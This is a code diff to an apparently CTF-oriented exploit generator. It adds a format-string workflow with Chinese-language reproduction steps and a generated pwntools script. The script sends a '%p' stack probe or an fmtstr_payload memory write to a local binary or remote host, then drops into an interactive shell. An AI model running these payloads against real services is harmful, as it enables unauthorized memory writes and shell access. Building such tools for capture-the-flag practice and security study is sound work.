@@ -594,6 +594,13 @@ def _pwn_exploit_reproduction_steps(plan: dict[str, Any], attachments: list[str]
             f"脚本会读取 ELF 符号 `{symbol}`，构造 padding + {symbol} 地址的 ret2win payload。",
             "payload 发送后进入 `io.interactive()`，用于拿 shell 或读取服务回显 flag。",
         ]
+    if workflow == "format_string":
+        return [
+            f"本地模式：把附件 {binary} 放在 exploit.py 同目录，先执行 `python3 exploit.py --binary ./{binary} --probe` 发送 `%p` 栈探测 payload。",
+            f"确认格式化字符串 offset 后，执行 `python3 exploit.py --binary ./{binary} --offset <offset>` 发送验证 payload。",
+            "远程模式：执行 `python3 exploit.py --remote --host <host> --port <port> --probe` 或带 `--offset <offset>` 复现远端交互。",
+            "如已确认写入目标，可传入 `--write-target 0x... --write-value 0x...`，脚本会用 `fmtstr_payload` 生成写入 payload。",
+        ]
     return [
         f"本地模式：把附件 {binary} 放在 exploit.py 同目录，执行 `python3 exploit.py --binary ./{binary}`。",
         "远程模式：把 HOST/PORT 改成题目给出的地址端口，或执行 `python3 exploit.py --remote --host <host> --port <port>`。",
@@ -620,6 +627,8 @@ def _pwn_exploit_script(plan: dict[str, Any], attachments: list[str]) -> str:
         return _ftp_heap_format_string_exploit_script(plan, attachments)
     if workflow == "ret2win":
         return _ret2win_exploit_script(plan, attachments)
+    if workflow == "format_string":
+        return _format_string_exploit_script(plan, attachments)
     binary = _basename(attachments[0]) if attachments else "challenge_binary"
     return f"""#!/usr/bin/env python3
 from pwn import *
@@ -645,6 +654,68 @@ def main():
     args = parse_args()
     io = start(args)
     # Fill in the payload from the PwnSolver evidence, then keep the shell open.
+    io.interactive()
+
+
+if __name__ == "__main__":
+    main()
+"""
+
+
+def _format_string_exploit_script(plan: dict[str, Any], attachments: list[str]) -> str:
+    binary = _basename(attachments[0]) if attachments else "challenge_binary"
+    probe = str(plan.get("offset_probe") or "%p." * 24)
+    return f"""#!/usr/bin/env python3
+from pwn import *
+import argparse
+
+DEFAULT_PROBE = {probe.encode("utf-8")!r}
+
+
+def parse_args():
+    parser = argparse.ArgumentParser(description="ForgeFlag generated format-string harness")
+    parser.add_argument("--remote", action="store_true")
+    parser.add_argument("--host", default="127.0.0.1")
+    parser.add_argument("--port", type=int, default=31337)
+    parser.add_argument("--binary", default="./{binary}")
+    parser.add_argument("--probe", action="store_true", help="send a %%p stack probe to discover the format offset")
+    parser.add_argument("--offset", type=int, default=None, help="confirmed format-string offset")
+    parser.add_argument("--write-target", type=lambda value: int(value, 0), default=None)
+    parser.add_argument("--write-value", type=lambda value: int(value, 0), default=None)
+    parser.add_argument("--payload", default="", help="raw payload override")
+    parser.add_argument("--log-level", default="info")
+    return parser.parse_args()
+
+
+def start(args):
+    if args.remote:
+        return remote(args.host, args.port)
+    return process(args.binary)
+
+
+def build_payload(args):
+    if args.payload:
+        return args.payload.encode()
+    if args.probe:
+        return DEFAULT_PROBE
+    if args.offset is None:
+        log.failure("missing --offset; run with --probe first and inspect the output")
+        raise SystemExit(2)
+    if args.write_target is not None and args.write_value is not None:
+        return fmtstr_payload(args.offset, {{args.write_target: args.write_value}}, write_size="short")
+    return f"%{{args.offset}}$p".encode()
+
+
+def main():
+    args = parse_args()
+    context.log_level = args.log_level
+    if not args.remote:
+        context.binary = args.binary
+
+    io = start(args)
+    payload = build_payload(args)
+    log.info("sending %d bytes", len(payload))
+    io.sendline(payload)
     io.interactive()
 
 
